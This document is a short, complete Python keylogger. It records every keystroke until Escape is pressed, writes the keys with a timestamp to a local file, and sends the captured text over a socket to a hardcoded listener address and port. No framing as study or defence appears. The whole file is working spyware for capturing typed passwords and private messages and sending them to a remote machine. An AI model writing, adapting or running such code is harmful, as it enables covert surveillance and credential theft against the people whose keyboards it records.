import keyboard
import datetime
import socket


def connect():
    ip = '192.168.1.11'
    port = 5000
    s = socket.socket()
    s.connect((ip, port))
    return s


def write_to_file(recorded):
    with open('keylog.txt', 'a', encoding='utf-8') as f:
        result = str(datetime.datetime.now()) + ': '
        for key in recorded:
            if len(key.name) > 1:
                if key.name == 'space': 
                    result += ' '
                else:
                    result += '[' + key.name + ']'
            else: 
                result += key.name
        result += '\n'
        f.write(result)
        f.close()
        return result


def send_to_server(connection, result):
    connection.send(result.encode('utf-8'))


recorded = keyboard.record(until='esc')
recorded = [event for event in recorded if event.event_type == 'down'][:-1]

connection = connect()
result = write_to_file(recorded)
send_to_server(connection, result)
